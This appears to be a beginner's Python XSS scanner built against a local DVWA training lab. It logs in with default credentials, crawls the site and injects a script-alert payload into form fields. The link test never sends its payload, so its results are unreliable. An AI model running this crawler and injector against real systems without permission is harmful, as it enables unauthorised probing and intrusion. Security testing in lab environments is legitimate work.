import requests
import urllib.parse
import re
from bs4 import BeautifulSoup
import scanner
target_url="http://192.168.1.102/dvwa/"
lti=["http://192.168.1.102/dvwa/logout.php"]
data_dic={"username": "admin","password": "password","Login": "submit"}
val_scanner=scanner.Scanner(target_url,lti)
response=val_scanner.session.post("http://192.168.1.102/dvwa/login.php",data=data_dic)

val_scanner.subdomains1()
val_scanner.run_scanner()
class Scanner:
    def __init__(self,url,lti):
        self.session=requests.Session()
        self.target_url=url
        self.target_links=[]
        self.lti=lti
    def request(self,url):
        try:
            response =self.session.get(url)
            return re.findall('(?:href=")(.*?)"', response.content.decode('ISO-8859-1'))
        except requests.exceptions.ConnectionError:
            pass
    def subdomains1(self,url=None):
        if url ==None:
          url=self.target_url
        href_n = self.request(url)
        for href in href_n:
            href = urllib.parse.urljoin(url, href)
            if "#" in href:
                href = href.split("#")[0]
            if self.target_url in href and href not in self.target_links and href not in self.lti:
                self.target_links.append(href)
                print(href)
                self.subdomains1(href)
    def extract_form(self,url):
        res = self.session.get(url)
        parse = BeautifulSoup(res.content, "html.parser")
        form_list = parse.find_all("form")
        return form_list
    def submit_in(self,form,value,url):
        action = form.get("action")
        ul = urllib.parse.urljoin(url, action)
        mm = form.get("method")
        inputs = form.findAll("input")
        post_data = {}
        for i in inputs:
            input_name = i.get("name")
            input_type = i.get("type")
            input_value = i.get("value")
            if input_type == "text":
                input_value = value
            post_data[input_name] = input_value
        if mm=="post":
         return self.session.post(ul, data=post_data)
        else:
         return self.session.get(ul, params=post_data)
    def run_scanner(self):
        for link in self.target_links:
            forms=self.extract_form(link)
            for form in forms:
                is_var=self.test_xss(form,link)
                if is_var:
                    print("\n\nXSS DISCOVERED"+link)
            if "=" in link:
                print("TESTING "+link)
                is_var = self.test_xss_link(link)
                if is_var:
                    print("\n\n+XSS DISCOVERED" + link)
    def test_xss(self,form,url):
        xss="<script>alert('0')</script>"
        response=self.submit_in(form,xss,url)
        if url=="http://192.168.1.102/dvwa/vulnerabilities/xss_r/":
         print(response.content)
        return "<script>alert" in str(response.content)
    def test_xss_link(self,url):
        xss = "<script>alert(0)</script>"
        response=self.session.get(url)
        return xss in str(response.content)
